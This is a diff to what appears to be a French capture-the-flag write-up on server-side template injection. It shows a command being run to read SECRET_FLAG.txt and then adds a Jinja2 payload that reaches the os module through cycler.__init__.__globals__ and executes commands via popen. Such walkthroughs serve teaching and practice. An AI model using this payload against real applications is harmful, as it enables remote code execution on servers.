@@ -33,3 +33,21 @@ Ensuite ex("ls") lance la commande sur le serveur
 
 On voit trois fichier donc un SECRET_FLAG.txt, donc viens juste remplacer ls par cat SECRET_FLAG.txt
 
+
+
+Mtn avec jinja2
+
+On a trouvé que self, un objet interne du moteur de template etait accessible
+On accede ensuite a un attribut prive de jinja2: "_TemplateReference__context"
+Ensuite cycler est une fonction utilitaire standard de jinja2
+ensuite `__init__.__globals__.os`
+On trouve ensuite:
+"content":"<module 'os' from '/usr/lib/python3.8/os.py'>"
+
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
+On liste les fichier
+
+
+
+
+
